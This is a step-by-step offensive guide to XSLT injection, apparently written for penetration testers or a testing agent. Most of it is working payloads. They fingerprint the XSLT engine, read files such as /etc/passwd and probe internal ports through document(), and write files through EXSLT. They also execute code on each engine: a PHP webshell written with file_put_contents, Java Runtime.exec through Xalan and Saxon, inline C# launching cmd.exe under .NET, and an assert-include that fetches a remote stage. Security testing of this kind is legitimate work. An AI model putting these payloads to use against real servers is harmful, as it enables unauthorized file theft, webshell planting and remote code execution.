# XSLT injection — engine fingerprint, file read/write, and per-engine code execution — Open WHEN: the sink transforms XML with a user-controlled XSL stylesheet (a `transform`/`xslt`/`xsl` parameter, a reporting/PDF engine, or an `xml-stylesheet` PI consumer) and you can supply or influence the stylesheet

XSLT injection is distinct from entity XXE: instead of declaring a `<!ENTITY>`,
you control the stylesheet that processes the XML. What you can do depends
entirely on **which processor** runs the transform — so fingerprint first, then
pick the matching technique. Many XSLT engines also still resolve external
entities, so always test classic XXE here too.

## Step 1 — fingerprint vendor + version (governs everything else)

Read the engine identity before trying anything heavier. `php:vendor` =
libxslt (PHP), `SAXON` = Saxon (Java), `Microsoft` = .NET / MSXML,
`Apache` / `Xalan` = Java Xalan, `Transformiix` = old Mozilla.

```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```

Fuller fingerprint (also prints version + vendor URL):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
Version: <xsl:value-of select="system-property('xsl:version')" />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

`xsl:version` matters: `2.0`/`3.0` means Saxon (Java) and unlocks far more than
`1.0`. The `xsl:version="1.0"` attribute on an `<html>` root (a "simplified
stylesheet") is the form to use when the sink wants a result-document, not a
full `<xsl:stylesheet>`.

## Step 2 — file read + SSRF via `document()`

`document()` pulls in an external resource as a node-set — works on most 1.0
engines and is the quietest first escalation:
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>   <!-- SSRF / port probe -->
    <xsl:copy-of select="document('/etc/passwd')"/>              <!-- Linux file read -->
    <xsl:copy-of select="document('file:///c:/windows/win.ini')"/> <!-- Windows -->
  </xsl:template>
</xsl:stylesheet>
```
`document()` of a non-XML file may fault on parse — use it for XML-shaped files,
SSRF probes, and directory reads; fall back to classic entity XXE or
`php://filter` for arbitrary file bytes. SSRF here reaches the same internal
targets as entity XXE (cloud metadata, Docker `2375`, Redis, kubelet).

## Step 3 — write files via EXSLT (libxslt / many engines)

The EXSLT `exsl:document` extension writes attacker-chosen content to disk —
drop a webshell into a web root, or plant a file for a separate sink:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text">Hello World!</exploit:document>
  </xsl:template>
</xsl:stylesheet>
```
Relative `href` lands relative to the process CWD; try `href="/var/www/html/x.txt"`
for an absolute write into a served path.

## Step 4 — code execution (engine-specific)

Only attempt after the fingerprint confirms the engine and its extension
functions are enabled. These are the high-impact paths.

### PHP (libxslt with `XSL::registerPHPFunctions` enabled)
Namespace `xmlns:php="http://php.net/xsl"` lets the stylesheet call PHP functions
directly. `readfile` / `scandir` for read+enumerate:
```xml
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body><xsl:value-of select="php:function('readfile','index.php')" /></body>
</html>
```
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/"><xsl:value-of select="php:function('scandir','.')"/></xsl:template>
</xsl:stylesheet>
```
Drop a webshell with `file_put_contents` (full command execution from there):
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','&lt;?php echo system($_GET[&quot;command&quot;]); ?&gt;')" />
  </xsl:template>
</xsl:stylesheet>
```
`php:function('assert', $code)` and `preg_replace('/.*/e', $code)` (PHP < 7) run
arbitrary PHP; `assert('include("http://HOST/x.php")')` pulls a remote stage.

### Java — Xalan (XSLT 1.0)
Map `java.lang.Runtime` into a namespace and call `exec`:
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'id')"/>
    <xsl:value-of select="ob:toString($process)"/>
  </xsl:template>
</xsl:stylesheet>
```

### Java — Saxon (XSLT 2.0 / `java-type`)
```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
  <xsl:template match="/">
    <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping HOST')" xmlns:Runtime="java:java.lang.Runtime"/>
  </xsl:template>
</xsl:stylesheet>
```

### .NET — MSXSL embedded script
`msxsl:script` runs inline C# (or VB) inside the transform — full process start:
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="urn:my-scripts">
  <msxsl:script language="C#" implements-prefix="user"><![CDATA[
    public string execute(){
      System.Diagnostics.Process proc = new System.Diagnostics.Process();
      proc.StartInfo.FileName="C:\\windows\\system32\\cmd.exe";
      proc.StartInfo.RedirectStandardOutput = true;
      proc.StartInfo.UseShellExecute = false;
      proc.StartInfo.Arguments = "/c dir";
      proc.Start(); proc.WaitForExit();
      return proc.StandardOutput.ReadToEnd();
    }
  ]]></msxsl:script>
  <xsl:template match="/"><xsl:value-of select="user:execute()"/></xsl:template>
</xsl:stylesheet>
```
A shorter form just calls `System.Diagnostics.Process.Start("cmd.exe")` from a
script function bound to a value used in the output.

## Escalation order
1. Fingerprint vendor/version (Step 1) — pick the engine path.
2. `document()` file read + SSRF (Step 2) — quiet, broad.
3. Classic entity XXE in the same stylesheet — many XSLT engines resolve it.
4. EXSLT file write (Step 3) — plant a webshell or a file for another sink.
5. Engine-specific code execution (Step 4) — only once the fingerprint and
   extension support are confirmed.

## Validation
- A real XSLT finding shows the transformed output reflecting injected content
  (the vendor string, a file's bytes, a `document()` SSRF response, or command
  output) — not just a stylesheet accepted without effect.
- Code-execution claims need observed command output or a confirmed file write,
  reproduced against the same endpoint. A stylesheet that parses but whose
  extension functions are disabled is a false positive — report read/SSRF only.
